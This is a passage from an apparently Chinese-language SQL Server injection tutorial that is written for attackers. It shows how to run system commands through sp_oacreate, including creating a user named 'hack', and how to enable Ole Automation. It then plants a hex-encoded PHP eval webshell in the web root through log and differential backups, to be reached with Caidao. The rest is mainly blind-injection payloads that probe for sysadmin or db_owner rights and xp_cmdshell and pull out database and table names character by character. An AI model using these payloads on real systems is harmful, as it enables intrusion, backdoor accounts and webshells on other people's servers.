使用下面命令查看是否可使用 sp_oacreate 执行系统命令
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'whoami'
如果SQLServer 阻止了对组件 ‘Ole Automation Procedures’ 的过程 ‘sys.sp_OACreate’
的访问，可以使用以下命令打开。
    EXEC sp_configure 'show advanced options', 1;  
    RECONFIGURE WITH OVERRIDE;  
    EXEC sp_configure 'Ole Automation Procedures', 1;  
    RECONFIGURE WITH OVERRIDE;  
再次执行命令，发现不报错。此时可以执行系统命令了，但是使用 sp_oacreate 执行系统命令不回显
于是我们可以使用以下命令创建用户hack。
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user hack Password@ /add'
## DB_owner权限LOG备份Getshell
无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马
**SQLServer常见的备份策略：**
  1. 每周一次完整备份
  2. 每天一次差异备份
  3. 每小时一次事务日志备份
**利用前提** ：
  1. 目标机器存在数据库备份文件 ，也就是如下，我们利用test数据库的话，则需要该test数据库存在数据库备份文件
  2. 知道网站的绝对路径
  3. 该注入支持堆叠注入
    alter database 数据库名 set RECOVERY FULL;   #修改数据库恢复模式为 完整模式
    create table cmd (a image);        #创建一张表cmd，只有一个列 a，类型为image
    backup log 数据库名 to disk= 'C:\phpstudy\WWW\1.php' with init;   #备份表到指定路径
    insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e);  #插入一句话到cmd表里
    backup log 数据库名 to disk='C:\phpstudy\WWW\2.php';   #把操作日志备份到指定文件
    drop table cmd;    #删除cmd表
第四行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马  的16进制表示
会在目标网站根目录下生成1.php和2.php文件，其中1.php 保存数据库，2.php就是我们需要连接的木马文件。
用菜刀连接即可
## DB_owner权限差异备份Getshell
**利用前提** ：
  1. 知道网站的绝对路径 C:phpstudyWWW
  2. 该注入支持堆叠注入
注：以下语句一条一条执行
    create table [dbo].[test] ([cmd] [image])
    declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x786965 backup log @a to disk = @s with init,no_truncate
    insert into [test](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)
    declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000 backup log @a to disk=@s with init,no_truncate
    Drop table [test]
  1. 这里第二行的 0x786965，是字符 xie 的16进制表示，这里随便填都可以
  2. 第三行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马  的16进制表示
  3. 第四行的0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000是 C:phpstudyWWWshell.php 的16进制表示
然后会在目标网站根目录下生成shell.php木马文件
用菜刀连接即可
## 盲注SQLServer数据库
**判断是否是SQLServer数据库**
SQLServer数据库特有的表是： **sysobjects** ，所以可以用它来判断是否是SQLServer数据库
    exists(select*from sysobjects)  
**判断当前数据库用户权限**
    and 1=(IS_SRVROLEMEMBER('sysadmin'))        //返回正常为sa
    and 1=(IS_MEMBER('db_owner'))               //返回正常为DB_OWNER
    and 1=(IS_srvrolemember('public'))          //public权限,较低
如果当前用户是sa，则执行三个都正常显示。如果是db_owner，则执行sa不正常显示，执行public正常显示。如果是public，则只执行public才正常显示
**判断xp_cmdshell是否存在**
    and 1=(Select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')  
正常显示，说明已开启。如果不存在，则需要开启。
如果开启后，相关通过xp_cmdshell执行系统命令，需要该注入点存在堆叠注入
**判断数据库的个数**
    and (select count(name) from master..sysdatabases)=N
由图可知，有7个数据库
**判断dbid个数，一般数据库有多少个，dbid的值就为多少**
     and (select count(*) from master..sysdatabases where dbid=N)=1
**通过dbid得到所有数据库名**
当使用上一条命令不能执行时，可以使用下面的命令，查询数据库的个数，以及每个数据库的名字
    判断dbid数据库的长度，由以下得知dbid为1数据库的长度是8
    and len(db_name(1))>5         //正常显示
    and len(db_name(1))>6         //不正常显示
    大于5正常显示，大于6不正常显示，所以第一个数据库长度是6，即
    一般来说，查的前6个数据库就是自带的那6个数据库，第7个开始才是我们自己建的
    and len(db_name(7))>3         //正常显示
    and len(db_name(7))>4         //不正常显示
    大于3正常显示，大于4不正常显示，所以第7个数据库名的长度为4
    判断dbid为7数据库字符的ascii值
    and ascii(substring(db_name(7),1,1))>100   //正常显示
    and ascii(substring(db_name(7),1,1))>150   //不正常显示
    and ascii(substring(db_name(7),1,1))>125   //不正常显示
    and ascii(substring(db_name(7),1,1))>112   //正常显示
    and ascii(substring(db_name(7),1,1))>118   //不正常显示
    and ascii(substring(db_name(7),1,1))>115   //正常显示
    and ascii(substring(db_name(7),1,1))>116   //不正常显示
    大于115正常显示，大于116不正常显示，所以第七个数据库的第一个字符的ascii值为116，对应的字符是t
    以此类推，数据库的第二个字符为  and ascii(substring(db_name(7),2,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(7),3,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(7),4,1))>100
    最后得到第7个数据库名为：test
**判断当前数据库名**
    判断数据库的长度，由以下得知数据库的长度是8
    and len(db_name())>3         //正常显示
    and len(db_name())>4         //不正常显示
    大于3正常显示，大于4不正常显示，所以数据库名的长度为4
    判断数据库字符的ascii值，用二分法
    and ascii(substring(db_name(),1,1))>100   //正常显示
    and ascii(substring(db_name(),1,1))>150   //不正常显示
    and ascii(substring(db_name(),1,1))>125   //不正常显示
    and ascii(substring(db_name(),1,1))>112   //正常显示
    and ascii(substring(db_name(),1,1))>118   //不正常显示
    and ascii(substring(db_name(),1,1))>115   //正常显示
    and ascii(substring(db_name(),1,1))>116   //不正常显示
    大于115正常显示，大于116不正常显示，所以数据库第一个字符的ascii值为116，对应的字符是t
    以此类推，数据库的第二个字符为  and ascii(substring(db_name(),2,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(),3,1))>100
             数据库的第三个字符为：and ascii(substring(db_name(),4,1))>100
    最后得到数据库名为：test
这里我们已经知道了当前数据库名为： test
**爆破test数据库中表的个数**
    and (select count(name) from test..sysobjects where xtype='U')>0   正常显示
    and (select count(name) from test..sysobjects where xtype='U')>1   不正常显示
    所以test数据库只有一个表
**爆破test数据库中表**
这里爆破表的时候，不能爆破表名的长度，所以只能爆破表名的一个一个字符。当爆破到第某个字符出现其ascii值>0都不正常显示时，说明这个字符位不存在，所以到前一位为止。注意，这里爆破得到的表名有
dbo.
    第一个表的第一个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),1,1))>N
    第一个表的第二个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),2,1))>N
    第一个表的第三个字符的ascii值
    AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(test..sysusers.name+CHAR(46)+test..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND test..sysusers.name+CHAR(46)+test..sysobjects.name NOT IN (SELECT TOP 0 test..sysusers.name+CHAR(46)+test..sysobjects.name FROM test..sysobjects INNER JOIN test..sysusers ON test..sysobjects.uid = test..sysusers.uid WHERE test..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name) ORDER BY test..sysusers.name+CHAR(46)+test..sysobjects.name),3,1))>N
    ......